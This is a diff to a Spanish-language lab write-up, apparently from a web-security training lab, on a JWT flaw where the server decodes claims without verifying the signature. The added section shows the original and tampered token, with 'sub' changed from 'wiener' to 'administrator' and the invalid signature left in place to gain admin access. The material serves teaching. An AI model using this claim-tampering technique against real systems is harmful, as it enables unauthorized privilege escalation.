@@ -15,6 +15,20 @@ tags:
 ## Qué muestra
 El server **decodifica los claims pero NO verifica la firma**. Cambiás `sub` a `administrator` y entra, aunque la firma quede inválida.
 
+## JWT (original → modificado)
+
+**Original** (decodificado)
+```json
+{ "kid": "…", "alg": "RS256" }   // header
+{ "sub": "wiener" }              // payload
+```
+**Modificado**
+```json
+{ "kid": "…", "alg": "RS256" }   // header   (sin cambios)
+{ "sub": "administrator" }       // payload  ← cambiado
+```
+> **Firma:** se deja la original → queda **inválida**, pero el server no la verifica.
+
 ## Diagrama
 
 ```mermaid
